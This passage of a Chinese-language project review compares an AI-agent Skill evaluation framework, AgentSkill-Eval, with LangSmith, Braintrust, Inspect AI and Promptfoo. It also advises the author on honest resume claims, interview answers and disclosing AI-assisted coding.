- Dataset、Solver、Scorer；
- Agent 和 external coding agent；
- 200+ 评测；
- Web View 和 VS Code；
- Docker/Kubernetes/Modal 等 Sandbox；
- MCP 和多 Agent；
- SWE-bench 集成。

参考：

- <https://inspect.aisi.org.uk/>
- <https://inspect.aisi.org.uk/tutorial.html>

在通用评测执行、Provider 支持和 Sandbox 上，当前项目无法与其比成熟度。

### 87.4 Promptfoo

Promptfoo 已支持：

- coding agent providers；
- plain LLM baseline；
- OpenTelemetry Trace；
- cost/latency assertions；
- trajectory assertions；
- Skill usage detection；
- Agent security red team。

参考：

- <https://www.promptfoo.dev/docs/guides/evaluate-coding-agents/>
- <https://www.promptfoo.dev/docs/tracing/>

因此“支持 coding agent、成本和过程评测”也不是独有卖点。

## 88. 竞品矩阵

| 能力 | AgentSkill-Eval | LangSmith | Braintrust | Inspect AI | Promptfoo |
|---|---|---|---|---|---|
| 数据集和实验 | 有 | 强 | 强 | 强 | 强 |
| Agent Trace | 有 | 强 | 强 | 强 | 强 |
| Coding Agent | 有 | 有 | 可接入 | 强 | 强 |
| 确定性 Grader | 有 | 有 | 有 | 强 | 有 |
| Sandbox | 弱 | 依接入 | 依接入 | 强 | 依 Provider |
| 团队 UI | 弱 | 强 | 强 | 中 | 中 |
| Skill 一等版本对象 | 强调 | 通用版本 | 通用 Prompt/Task | Solver 为主 | Prompt/Provider |
| without/v1/v2 配对协议 | 专门设计 | 可实现 | 可实现 | 可实现 | 可实现 |
| Git 历史四态 Case | 强 | 非内置重点 | 非内置重点 | 可集成 SWE-bench | 可配置 |
| Exposure/Locked/Promotion | 部分实现 | 通用实验 | 通用 Release | Eval log 为主 | CI Gate |

结论：

> 你的差异不在“别人做不到”，而在“你把 Skill 版本实验的约束预置成领域协议”。

## 89. 哪些功能不能作为创新点

以下都是成熟模式：

- A/B Evaluation；
- Trace；
- Token/Cost；
- LLM-as-Judge；
- Dataset Version；
- Successive Halving；
- Pareto；
- Content Hash；
- Human Review；
- CI Gate；
- MCP/RAG 指标；
- Dashboard。

可以作为工程实现亮点，但不能作为“核心创新”。

## 90. 当前最强的三个差异点

### 90.1 Skill 是一等被测变量

项目不是泛化地比较两个 Agent，而是显式冻结：

- Agent；
- Model；
- Tool；
- Environment；
- Budget；

只改变：

- without Skill；
- Skill v1；
- Skill v2。

这让“Skill 的边际价值”成为一等 estimand。

### 90.2 Git 历史四态 Benchmark

```text
before fail
after pass
mutation fail
alternative pass
```

它把历史修复转成可执行 Case，同时检查 Oracle 是否对关键行为敏感、又不绑定唯一补丁。

这是很适合面试展开的工程机制。

### 90.3 证据不足时拒绝发布

项目保留：

- invalid；
- Loss；
- search winner 的 provisional 状态；
- regression 无正向 Win；
- locked burn；
- human approval。

真实 `0W/4T/0L` 被拒绝，比一个模拟正向数字更能体现协议价值。

## 91. 创新类型评分

| 类型 | 评分 | 判断 |
|---|---:|---|
| 模型/算法创新 | 3/10 | 没有新模型或新优化算法 |
| 统计方法创新 | 4/10 | 使用已知配对和 bootstrap |
| Benchmark 工程 | 7.5/10 | Git 四态重建较完整 |
| 评测协议创新 | 7/10 | Skill 版本和门禁组合有价值 |
| 系统工程创新 | 6.5/10 | 证据链完整，但成熟度不足 |
| 产品创新 | 4.5/10 | 用户旅程和 UI 弱 |

秋招项目不要求论文级算法创新，但必须准确说：

> 创新主要是领域协议和工程机制，不是提出了新的学习算法。

## 92. 当前创新被功能堆叠稀释

当 README 同时强调：

- Bug Fix；
- MCP；
- RAG；
- Benchmark；
- Trace；
- Search；
- Promotion；
- Dashboard；
- Evidence Release；

面试官记不住核心机制，只会看到 Agent 领域常见名词集合。

### 解决方式

主叙事只保留：

```text
SkillDelta
├── Paired Evaluation
├── Exposure-aware Benchmark
└── Evidence-gated Promotion
```

MCP/RAG 只作为：

> 统一协议可扩展性的实验验证。

不要占据简历主 bullet。

## 93. 推荐的单一深机制：Exposure-Aware SkillDelta Protocol

这是最值得继续做深的方向。

### 93.1 核心对象

```text
SkillVersion
DatasetVersion
DatasetExposureState
PairExperiment
SkillDeltaReport
PromotionDecision
```

### 93.2 核心 invariant

1. 实验只允许一个 Skill 变量变化；
2. Dataset exposure 只能单向增加；
3. 影响候选生成的数据永久不能回到 holdout；
4. SkillDelta 必须同时报告质量和成本；
5. search winner 不能直接发布；
6. locked 数据只消费一次；
7. 每个 Promotion 能追溯父 Skill、数据和实验。

### 93.3 输出

```text
SkillDeltaReport
├── no-skill vs v1
├── v1 vs v2
├── Case W/T/L
├── Trace delta
├── Token/Latency delta
├── Dataset exposure lineage
├── confidence/claim level
└── promotion blockers
```

这比“又一个 Eval 平台”更有辨识度。

## 94. 为什么 Exposure-Aware 是真正的技术增量

现有通用评测平台通常允许用户自行组织数据和实验。

你的协议可以把以下错误变成系统级拒绝：

- regression failure 被拿去生成候选后又继续当 regression；
- locked test 被重复打开；
- v2 使用了不同预算；
- search winner 未 confirmation 就发布；
- DatasetVersion 标签与真实 exposure 不一致。

这不是 UI 功能，而是可验证 invariant。

## 95. 第二个可选深机制：Paired Trace Delta

当前 Trace 比较主要是事件计数和序列差异。

可以深化为：

```text
同一个 Case:
control trajectory
vs
treatment trajectory
```

输出：

- 首次分叉步骤；
- 新增/缺失工具调用；
- 重试和循环差异；
- 验证步骤差异；
- 成本差异；
- 最终状态差异；
- 可观察因果假设。

注意：

> Trace Delta 提供可观察行为差异，不自动等于根因。

如果做深，它可以成为 Skill 修改的可解释输入。

## 96. 如何证明项目差异，而不是只写 README

设计一个对照实验：

### Naive Eval

```text
只看 treatment 平均分
-> 选择 search winner
-> 直接发布
```

### AgentSkill-Eval

```text
配对比较
-> invalid 隔离
-> regression
-> exposure gate
-> cost gate
-> independent confirmation
```

展示一个反例：

```text
Naive Eval 判断提升
但真实原因是：
数据泄漏 / invalid / 3x Token / Loss

AgentSkill-Eval 拒绝发布
```

这会直接证明协议价值。

## 97. 正确的竞品定位

不要说：

> 我做了一个比 LangSmith 更完整的平台。

建议说：

> LangSmith、Braintrust 和 Inspect 解决通用 Trace、Eval 与执行基础设施；我的项目聚焦 Skill 作为可版本化变量时的数据暴露、配对增量和发布门禁。它可以把这些成熟工具作为 Runner/Trace 后端，而不是替代它们。

这既诚实，又体现架构判断。

## 98. 推荐增加现有工具 Adapter

比继续自研 Dashboard 更有价值：

```text
InspectRunnerAdapter
LangSmithTraceExporter
BraintrustExperimentExporter
OTLP Trace Exporter
```

这样可以证明：

- 核心价值不依赖自研执行器；
- SkillDelta Protocol 可复用；
- 项目不是重复造通用观测平台；
- 可以借用成熟 Sandbox 和 UI。

优先级最高的是 Inspect Adapter，因为 Inspect 已有外部 coding agent 和 Sandbox。

## 99. 作者归属与 AI 辅助风险

公开历史显示：

- 4 天内约 164 个 commit；
- 45 个 remote branch；
- 多个 `codex/*` 分支；
- 7 个 `git-ai` author commit；
- 数万行代码和文档快速产生。

面试官会合理怀疑：

> 这些代码是你设计、理解和验证的，还是由 Agent 批量生成后直接提交？

使用 AI 编码不是问题。问题是：

- 你能否解释关键 invariant；
- 能否现场修改；
- 能否发现 AI 生成代码中的真实缺陷；
- 是否知道哪些设计不合理；
- 实验是否由你负责。

## 100. 不要隐藏 AI 使用

不要：

- 重写历史掩盖 `codex`；
- 声称逐行手写；
- 把生成测试数量当个人能力；
- 无法解释时说“这是框架自动生成”。

建议回答：

> 我使用 Coding Agent 加速样板代码、测试和文档，但实验协议、状态 invariant、数据隔离和最终验收由我定义。我也通过故障注入和真实实验发现了候选存储崩溃窗口、split 泄漏和错误归因问题，并负责修正。

这比假装不用 AI 更符合岗位。

## 101. 如何证明你真正拥有项目

准备五类证据。

### 101.1 ADR

至少写：

```text
ADR-001: 为什么使用 PairBlock
ADR-002: 为什么 FAIL 和 INVALID 分离
ADR-003: 为什么 Manifest 是真值、SQLite 是索引
ADR-004: 为什么 search/locked 隔离
ADR-005: 为什么 Funcy 数据必须 burn 为 train
```

每篇包含：

- Context；
- Alternatives；
- Decision；
- Consequences；
- Rejected options。

### 101.2 真实问题复盘

准备：

- grader environment 被错误标 FAIL；
- regression 0W/4T/0L；
- candidate history 崩溃窗口；
- split exposure 漂移。

面试官更相信你能解释失败，而不是只展示成功。

### 101.3 现场代码

必须能现场完成：

- 在 Failure Bridge 增加 split 校验；
- 给 ProcessSupervisor 增加输出上限；
- 统一 PairClassificationPolicy；
- 为 candidate recovery 写 fault-injection test。

### 101.4 手算实验

能在白板手算：

- Case repeats；
- W/T/L；
- invalid 两种口径；
- Token overhead；
- McNemar discordant pairs。

### 101.5 Demo

五分钟只展示：

1. 同题两臂；
2. 一个 Win；
3. 一个 Invalid；
4. 一个 Loss/阻断；
5. 证据回溯；
6. V2 claim limit。

## 102. 代码规模是负债，不是天然亮点

如果简历写“7 万行代码”，面试官可能追问任何模块。

代码规模过大带来：

- 解释负担；
- AI 生成怀疑；
- 边界不清；
- Bug 面积；
- 与三天开发周期不匹配。

建议简历不写行数。

写：

- 关键机制；
- 数据规模；
- 实验数量；
- 故障注入；
- 被系统阻止的错误发布。

## 103. 当前可使用的简历 Bullet

### Bullet 1：实验协议

> 设计 Agent Skill 控制变量配对评测协议，冻结模型、Runner、数据和预算，仅改变 Skill 版本；按 Case 聚合 Win/Tie/Loss，并区分任务失败与基础设施 Invalid。

### Bullet 2：Benchmark

> 从 5 个开源 Python 仓库重建 20 个历史缺陷 Case，通过 before-fail、after-pass、reverse-mutation-fail 和 alternative-fix-pass 四态门验证 Oracle，并记录 DatasetVersion 和来源谱系。

### Bullet 3：工程证据

> 基于 Pydantic、asyncio 和本地内容寻址存储实现 Run/Attempt 状态机、Runner Adapter、Trace 与故障恢复；通过原子 Manifest、SHA-256 和 fault-injection test 保留可重放证据。

### Bullet 4：真实实验

当前 V2 尚未冻结前建议：

> 接入 Qwen Code、Qwen3 本地模型和 DeepSeek Proposal，完成真实 baseline 与候选生成实验；系统保留 Invalid、成本和负结果，并在缺少正向 Win 时拒绝 Promotion。

不要提前写：

> V2 成功率提升 X%。

## 104. V2 完成后 Bullet 的门槛

只有满足以下条件才写提升数字：

- V2 vs v1；
- 独立 regression；
- 未使用 Funcy train Case；
- 多仓库；
- repeats；
- 无 Loss；
- 效率门通过；
- confirmation 或 locked；
- 报告精确 CI/claim。

示例模板：

> 在 N 个未参与候选生成的独立 Bug Fix Case 上，Skill v2 相对 v1 获得 W Wins、L Losses，绝对成功率差为 Xpp；Token 开销 Y%，通过预注册 regression/locked 门。

## 105. 不能写的简历表述

| 表述 | 原因 |
|---|---|
| 全自动 Skill 优化 | 当前有人工审核和阶段授权 |
| 显著提升 25% | 4 Case 单次 smoke |
| 生产级平台 | 无服务控制面和强 Sandbox |
| 不可篡改证据链 | 只有 tamper-evident hash |
| 支持通用 MCP/RAG | 主要是离线 Lab |
| 独创 Agent Trace | 竞品成熟覆盖 |
| 自研高性能 Sandbox | 未实现 |
| 20 Case 证明泛化 | 样本和污染风险不足 |

## 106. GitHub 仓库需要的可信度改造

### 清理

- 删除已合并远程分支；
- 移除空目录；
- README 压缩；
- 只保留一个最新状态入口；
- 新发布 RC；
- 修复 stale docs。

### 增加

- ADR；
- Threat Model；
- V2 preregistration；
- Exposure Ledger；
- Architecture dependency graph；
- one-command demo；
- Release attestation；
- Roadmap issue。

### 不要做

- 重写提交历史假装纯手工；
- 删除负实验；
- 伪造 stars/downloads；
- 为好看修改阈值。

## 107. 外部验证比继续加功能更重要

当前缺少：

- 外部贡献者；
- 第三方复现；
- 用户反馈；
- 与现有工具对比；
- 独立 benchmark review。

建议找一名同学：

1. 不看你的内部文档；
2. 从 Release 安装；
3. 评测一个自己的 Skill；
4. 记录卡点；
5. 提交 Issue；
6. 复现报告 hash。

一个真实外部复现，比新增一个 RAG 模块更有价值。

## 108. 最小竞品对照实验

选择同一组 8 个 Case：

```text
Promptfoo/Inspect:
运行 v1/v2 并比较最终通过率

AgentSkill-Eval:
同样运行
+ PairBlock
+ Exposure
+ W/T/L
+ Invalid taxonomy
+ Promotion gate
```

目标不是打败竞品速度，而是证明：

> 通用 Eval 后端可以执行任务，SkillDelta Protocol 额外提供了版本与数据治理语义。

## 109. 面试官最终如何判断创新

面试官通常会问三层：

### 第一层：有没有用

- Skill 改进是否真实；
- 能否防回归；
- 用户是否能运行。

### 第二层：为什么不是已有工具配置

- 哪些 invariant 是现有工具不默认提供；
- 为什么需要新领域对象；
- 是否可以建立在现有工具上。

### 第三层：有没有深度

- 数据暴露如何单向迁移；
- failure attribution 如何避免伪因果；
- locked 如何不可重复；
- 多阶段语义如何一致；
- 证据如何恢复。

只有第三层回答扎实，创新才成立。

## 110. 第 5 轮 P0/P1/P2 清单

### P0：简历提交前

1. 主叙事改为 `Exposure-Aware SkillDelta Protocol`；
2. 去掉“通用平台、全自动、生产级”；
3. 明确 AI-assisted 开发；
4. 准备 5 篇 ADR；
5. 能现场修改 4 个关键问题；
6. V2 未独立确认前不写提升数字。

### P1：提高创新证据

1. 实现 Exposure Ledger；
2. 生成统一 SkillDeltaReport；
3. 做 naive eval 对照；
4. 增加 Inspect/OTLP Adapter；
5. 外部用户复现；
6. 做候选 ablation。

### P2：后续研究

1. Paired Trace Delta；
2. 多模型 Skill 泛化；
3. repository-level hierarchical inference；
4. Skill optimizer 新搜索算法；
5. 开放 SkillDelta schema/spec。

## 111. 第 5 轮面试追问

1. 你的项目与 LangSmith 最大区别是什么？
2. 为什么不直接在 Braintrust 写一个 Eval？
3. Inspect 已有 Coding Agent 和 Sandbox，你还剩什么价值？
4. Promptfoo 已支持 Skill usage 和 cost assertions，你哪里不同？
5. 你的算法创新是什么？
6. Successive Halving 是你提出的吗？
7. 四态 Benchmark 与 SWE-bench 有何区别？
8. 哪些代码是你写的，哪些由 Coding Agent 生成？
9. 三天内为什么能有数万行代码？
10. 你能现场修复哪个真实 Bug？
11. 如果删掉 80% 功能，你保留什么？
12. 当前有外部用户吗？
13. 为什么仓库没有 stars/forks？
14. V2 没有正结果时项目还有什么价值？
15. 你的核心创新如何被实验证明？

第 1 题推荐回答：

> LangSmith 是通用 Trace 和 Eval 平台；我的项目不与它竞争观测能力，而是把 Skill 作为一等版本对象，预置 without/v1/v2 配对、Dataset exposure 单向迁移和 evidence-gated promotion。未来可以把 LangSmith 作为 Trace 后端。

第 5 题推荐回答：

> 项目没有提出新的模型算法。创新在评测协议：以 Skill 版本为唯一处理变量，把失败数据暴露、配对增量、回归和 locked 发布编码成可验证状态机。算法部分主要使用成熟的 bootstrap 和 successive halving。

第 8 题推荐回答：

> Coding Agent 参与了样板代码、测试和文档生成；我负责问题定义、实验协议、invariant、真实运行和验收。我能解释 Planner、Runner Adapter、Storage、Statistics、Failure Bridge 和 Promotion，并能指出现有实现中的崩溃窗口、split 泄漏和错误归因。

---

# 第 5 轮结论

项目的创新不应由“模块数量”证明，而应由一个不可替代的机制证明：

```text
Skill 是版本对象
Dataset 有暴露状态
Experiment 只改变 Skill
Delta 同时衡量质量和成本
Evidence 不足则拒绝 Promotion
```

如果把这一机制实现完整，并证明它能阻止通用 Eval 容易遗漏的错误发布，项目的创新性足以支撑秋招。

如果继续扩展 MCP、RAG、API、Worker，却没有 Exposure Ledger 和独立 V2 证据，项目会继续呈现为功能拼装。
